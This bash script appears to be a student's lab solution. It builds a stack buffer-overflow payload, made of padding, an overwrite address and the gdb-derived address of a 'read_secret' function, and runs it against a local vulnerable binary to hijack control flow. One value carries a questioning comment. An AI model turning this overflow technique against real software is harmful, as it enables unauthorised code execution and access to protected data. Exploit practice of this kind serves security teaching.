#!/usr/bin/env bash

buffer=$(printf "%0.sa" {1..1134}) #  char buf[1134];

address="\x01\xcc\xff\xff" #loop address pointer?

read_secret_address="\xc6\x91\x04\x08" #(gdb) p &read_secret -> $1 = (void (*)()) 0x80491c6 <read_secret>

gap=$(printf "%0.sa" {1..24})

/task2/s2149975/vuln "$(printf $buffer$address$gap$read_secret_address)"
